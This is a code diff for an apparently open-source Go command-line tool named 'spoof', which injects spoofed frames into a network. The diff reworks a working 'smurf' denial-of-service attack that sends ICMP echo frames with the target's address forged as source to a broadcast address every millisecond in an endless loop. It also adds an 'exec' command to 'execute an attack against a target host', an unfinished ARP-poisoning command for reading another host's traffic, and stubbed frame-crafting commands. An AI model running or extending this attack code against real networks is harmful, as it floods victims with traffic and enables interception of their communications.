@@ -7,6 +7,9 @@ import (
 	"os"
 	"time"
 
+	"github.com/adrianosela/spoof/payloads"
+	"github.com/adrianosela/spoof/wire"
+
 	"github.com/pkg/errors"
 	cli "gopkg.in/urfave/cli.v1"
 )
@@ -49,14 +52,24 @@ func smurfHandler(ctx *cli.Context) error {
 		return errors.New("invalid time string given")
 	}
 
-	s, err := newSpoofer(target, broadcast, ctx.String(name(ifaceFlag)))
+	w, err := wire.NewWire(ctx.String(name(ifaceFlag)))
 	if err != nil {
 		return err
 	}
 
-	fmt.Printf(banner, target, broadcast, every.String(), hex.Dump(s.payload))
+	payload, err := payloads.Build(payloads.TypeICMPEcho, payloads.Config{
+		SrcIP:  target,
+		DstIP:  broadcast,
+		SrcMAC: w.MAC(),
+		DstMAC: net.HardwareAddr{255, 255, 255, 255, 255, 255}, // broadcast MAC
+	})
+	if err != nil {
+		return errors.Wrap(err, "could not build payload")
+	}
+
+	fmt.Printf(banner, target, broadcast, every.String(), hex.Dump(payload))
 	for {
-		if err = s.inject(); err != nil {
+		if err = w.Inject(payload); err != nil {
 			return err
 		}
 		time.Sleep(every)
@@ -70,28 +83,59 @@ func main() {
 	app.Usage = "a utility for injecting spoofed frames into a network"
 	app.Commands = []cli.Command{
 		{
-			Name:    "smurf",
-			Aliases: []string{"s"},
-			Usage:   "make a network overwhelm a host with ICMP Echo replies",
-			Flags: []cli.Flag{
-				asMandatory(targetFlag),
-				withDefault(broadcastFlag, "255.255.255.255"),
-				withDefault(ifaceFlag, "en0"),
-				withDefault(everyFlag, "1ms"),
+			Name:    "exec",
+			Aliases: []string{"x"},
+			Usage:   "execute an attack against a target host",
+			Subcommands: []cli.Command{
+				{
+					Name:    "smurf",
+					Aliases: []string{"s"},
+					Usage:   "make a network overwhelm a host with ICMP Echo replies",
+					Flags: []cli.Flag{
+						asMandatory(targetFlag),
+						withDefault(broadcastFlag, "255.255.255.255"),
+						withDefault(ifaceFlag, "en0"),
+						withDefault(everyFlag, "1ms"),
+					},
+					Before: smurfValidator,
+					Action: smurfHandler,
+				},
+				{
+					Name:    "poison-arp",
+					Aliases: []string{"a"},
+					Usage:   "poison (spoof) a host's arp cache and read their traffic",
+					Flags:   []cli.Flag{
+						// TODO: flags
+					},
+					// TODO: before and action
+				},
 			},
-			Before: smurfValidator,
-			Action: smurfHandler,
 		},
 		{
-			Name:    "arpspoof",
-			Aliases: []string{"a"},
-			Usage:   "spoof a host's arp cache and read all of their traffic",
-			Flags:   []cli.Flag{
-				// TODO: flags
+			Name:    "craft",
+			Aliases: []string{"c"},
+			Usage:   "craft frames to be injected into the wire",
+			Subcommands: []cli.Command{
+				{
+					Name:  "icmp",
+					Usage: "craft icmp frames",
+					Flags: []cli.Flag{
+						// TODO: flags
+					},
+					// TODO: before and action
+				},
+				{
+					Name:  "arp",
+					Usage: "craft arp frames",
+					Flags: []cli.Flag{
+						// TODO: flags
+					},
+					// TODO: before and action
+				},
 			},
-			// TODO: before and action
 		},
 	}
+
 	app.CommandNotFound = func(c *cli.Context, command string) {
 		c.App.Run([]string{"help"})
 		fmt.Printf("\ncommand \"%s\" does not exist\n", command)
